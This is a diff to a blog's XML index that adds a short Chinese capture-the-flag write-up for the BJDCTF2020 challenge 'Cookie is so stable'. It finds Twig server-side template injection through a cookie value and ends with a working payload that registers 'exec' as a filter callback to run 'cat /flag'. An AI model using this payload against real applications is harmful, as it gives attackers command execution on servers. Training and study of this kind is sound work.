@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>BJDCTF2020 Cookie is so stable</title>
+      <link href="/2024/01/23/BJDCTF2020-Cookie-is-so-stable/"/>
+      <url>/2024/01/23/BJDCTF2020-Cookie-is-so-stable/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>随便登录一个用户名,发现会有 hello,xxx的字样</p><p>hint让我们查看一下cookie</p><p>可以看见cookie里面有一个user的值就是回显的内容,这很容易就能想到ssti</p><p>测试一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240123222241974.png" alt="image-20240123222241974"></p><p>的确如此哈</p><p>这里是php环境, 不过之前只做过smarty的模板注入,这里简单测试了一下并不是smarty</p><p>找了一篇大佬的好文</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html#">https://www.cnblogs.com/bmjoker/p/13508538.html#</a></p><p>最终的payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> buu刷题记录 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Twig </tag>
+            
+            <tag> ssti </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>GCTF 2023 web</title>
       <link href="/2024/01/22/GCTF-2023-web/"/>
       <url>/2024/01/22/GCTF-2023-web/</url>
